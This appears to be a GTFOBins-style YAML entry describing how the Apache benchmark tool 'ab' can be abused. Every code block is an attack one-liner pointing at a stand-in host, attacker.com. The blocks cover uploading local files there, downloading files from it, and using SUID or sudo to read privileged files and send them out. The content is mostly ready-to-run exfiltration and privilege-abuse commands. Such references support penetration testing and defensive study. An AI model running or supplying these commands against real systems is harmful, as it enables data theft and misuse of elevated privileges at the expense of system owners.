---
functions:
  file-upload:
    - description: Upload local file via HTTP POST request. Run a listener on the attacker box to collect the file. Adjust "-s timeout" and "-t timelimit" as needed.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        ab -s3 -t3 -n1 -p $LFILE $URL
  file-download:
    - description: Limited download capability. Can download text files with limited length in verbose mode. Cleanup local file after download. 
      code: |
          URL=http://attacker.com/file_to_download
          LFILE=file_to_save
          ab -v3 -n1 $URL > $LFILE
  suid:
    - description: does not drop privileges. Combine with file-upload to read files.
      code: |
         URL=http://attacker.com/
         LFILE=file_to_read
         ab -s3 -t3 -n1 -p $LFILE $URL
  sudo:
    - description: does not drop privileges. Combine with file-upload to read files.
      code: |
          URL=http://attacker.com/
          LFILE=file_to_read
          sudo ab -s3 -t3 -n1 -p $LFILE $URL
---
